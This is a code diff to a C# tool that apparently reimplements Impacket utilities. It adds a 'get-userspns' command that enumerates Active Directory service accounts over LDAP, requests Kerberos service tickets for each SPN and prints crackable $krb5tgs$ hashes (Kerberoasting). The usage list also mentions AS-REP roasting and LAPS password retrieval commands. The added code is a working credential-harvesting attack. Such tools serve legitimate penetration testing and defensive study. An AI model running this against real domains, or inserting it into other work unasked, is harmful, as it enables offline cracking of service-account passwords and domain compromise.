@@ -843,6 +843,110 @@ switch (args[0])
         return 0;
     }
 
+    case "get-userspns":
+    {
+        // GetUserSPNs.py (Kerberoasting): LDAP-search for accounts with a servicePrincipalName,
+        // then request a service ticket (TGS) for each SPN using our TGT. The service ticket's
+        // enc-part is encrypted with the service account's key -> a crackable $krb5tgs$ hash.
+        if (args.Length < 5)
+        {
+            Console.Error.WriteLine("usage: get-userspns <host> <user> <password> <domain-fqdn> [target-user] [port]");
+            return 2;
+        }
+
+        string host = args[1];
+        string user = args[2];
+        string password = args[3];
+        string domainFqdn = args[4];
+        string? targetUser = null;
+        int ldapPort = 389;
+        foreach (string a in args.Skip(5))
+        {
+            if (int.TryParse(a, out int p)) ldapPort = p;
+            else targetUser = a;
+        }
+
+        string realm = domainFqdn.ToUpperInvariant();
+        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
+        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";
+
+        // 1. LDAP-discover SPN accounts (enabled users with a servicePrincipalName).
+        const int UF_ACCOUNTDISABLE = 0x000002;
+        using LdapConnection ldap = LdapConnection.Connect(host, ldapPort);
+        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
+        if (!bind.Success)
+        {
+            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
+            return 1;
+        }
+
+        var conj = new List<LdapFilter>
+        {
+            LdapFilter.PresentOf("servicePrincipalName"),
+            LdapFilter.Negate(LdapFilter.Extensible("1.2.840.113556.1.4.803", "userAccountControl", UF_ACCOUNTDISABLE.ToString())),
+            LdapFilter.Equal("objectCategory", "person"),
+        };
+        if (targetUser is not null)
+        {
+            conj.Add(LdapFilter.Equal("sAMAccountName", targetUser));
+        }
+
+        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, LdapFilter.AllOf(conj.ToArray()),
+            new[] { "servicePrincipalName", "sAMAccountName" });
+
+        Console.WriteLine($"Querying {host} ({baseDn}) for accounts with an SPN (GetUserSPNs.py)");
+        Console.WriteLine();
+        if (entries.Count == 0)
+        {
+            Console.WriteLine("No SPN accounts found.");
+            return 0;
+        }
+
+        // 2. Get a TGT with the supplied credentials (used to authenticate each TGS-REQ).
+        Tgt tgt;
+        try
+        {
+            tgt = KerberosClient.GetTgt(host, realm, user, password);
+        }
+        catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
+        {
+            Console.Error.WriteLine($"[-] Could not get a TGT: {ex.Message}");
+            return 1;
+        }
+
+        // 3. Request a service ticket per SPN and print the roast hash.
+        int roasted = 0;
+        foreach (SearchEntry e in entries)
+        {
+            string sam = e.Get("sAMAccountName");
+            foreach (SearchAttribute attr in e.Attributes)
+            {
+                if (!string.Equals(attr.Type, "servicePrincipalName", StringComparison.OrdinalIgnoreCase))
+                {
+                    continue;
+                }
+
+                foreach (byte[] v in attr.Values)
+                {
+                    string spn = System.Text.Encoding.UTF8.GetString(v);
+                    try
+                    {
+                        Console.WriteLine(KerberosClient.Kerberoast(host, tgt, spn, sam));
+                        roasted++;
+                    }
+                    catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
+                    {
+                        Console.Error.WriteLine($"[-] {sam} ({spn}): {ex.Message}");
+                    }
+                }
+            }
+        }
+
+        Console.WriteLine();
+        Console.WriteLine($"{roasted} service ticket(s) roasted.");
+        return 0;
+    }
+
     case "kerb-tgt":
     {
         // getTGT.py (core path): request a TGT via an RC4-HMAC PA-ENC-TIMESTAMP AS exchange.
@@ -3284,6 +3388,7 @@ static void PrintUsage()
     Console.WriteLine("  get-laps <host> <user> <password> <domain-fqdn> [computer] [port]   # GetLAPSPassword: LDAP search for LAPS passwords");
     Console.WriteLine("  get-npusers <host> <user> <password> <domain-fqdn> [target-user] [port]   # GetNPUsers: AS-REP roast accounts without pre-auth");
     Console.WriteLine("  kerb-tgt <host> <user> <password> <domain-fqdn> [port]   # getTGT: request a Kerberos TGT (RC4 pre-auth)");
+    Console.WriteLine("  get-userspns <host> <user> <password> <domain-fqdn> [target-user] [port]   # GetUserSPNs: Kerberoast SPN accounts");
     Console.WriteLine("  ldap-signing <host> <domain> [port]   # CheckLDAPStatus (does the DC require LDAP signing)");
     Console.WriteLine("  rpc-dump-tcp <host> [port]");
     Console.WriteLine("                   Same, but DCERPC directly over TCP (ncacn_ip_tcp) to the endpoint mapper.");
